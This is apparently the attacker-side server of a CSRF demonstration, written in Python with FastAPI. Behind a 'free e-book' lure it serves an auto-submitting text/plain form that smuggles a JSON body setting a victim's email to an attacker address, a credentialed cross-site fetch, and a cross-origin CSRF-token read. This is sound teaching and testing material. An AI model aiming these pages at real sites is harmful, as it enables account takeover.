"""A malicious web site for the CSRF demo. It never sees alice's cookie.

Pages (target = full URL of an API endpoint):
  /form?target=...        auto-submitting HTML form, enctype=text/plain,
                          whose body happens to be valid JSON
  /fetch-json?target=...  fetch() with credentials and Content-Type: application/json
  /read-token?api=...     tries to read alice's CSRF token with fetch()

Run: uvicorn attacker:app --port 9000
"""

import html
import json

from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI(title="Free e-books (attacker)")

# name='{"email":"attacker@evil.example","ignore":"' value='"}'
# A text/plain form sends name=value, so the body becomes:
# {"email":"attacker@evil.example","ignore":"="}
FIELD_NAME = '{"email":"attacker@evil.example","ignore":"'
FIELD_VALUE = '"}'


@app.get("/form", response_class=HTMLResponse)
def form(target: str):
    return f"""<!doctype html>
<html><body>
<h1>Claim your free e-book</h1>
<form id="f" action="{html.escape(target)}" method="POST" enctype="text/plain">
  <input type="hidden" name='{html.escape(FIELD_NAME, quote=False)}' value='{FIELD_VALUE}'>
</form>
<script>document.getElementById('f').submit();</script>
</body></html>"""


@app.get("/fetch-json", response_class=HTMLResponse)
def fetch_json(target: str):
    return f"""<!doctype html>
<html><body><pre id="out">running</pre>
<script>
fetch({json.dumps(target)}, {{
  method: 'POST',
  credentials: 'include',
  headers: {{ 'Content-Type': 'application/json' }},
  body: JSON.stringify({{ email: 'attacker@evil.example' }})
}}).then(r => r.text().then(t => 'status ' + r.status + ' ' + t))
  .catch(e => 'blocked: ' + e)
  .then(msg => document.getElementById('out').textContent = msg);
</script></body></html>"""


@app.get("/read-token", response_class=HTMLResponse)
def read_token(api: str):
    return f"""<!doctype html>
<html><body><pre id="out">running</pre>
<script>
fetch({json.dumps(api + '/api/csrf-token')}, {{ credentials: 'include' }})
  .then(r => r.text())
  .then(t => 'read: ' + t)
  .catch(e => 'blocked: ' + e)
  .then(msg => document.getElementById('out').textContent = msg);
</script></body></html>"""
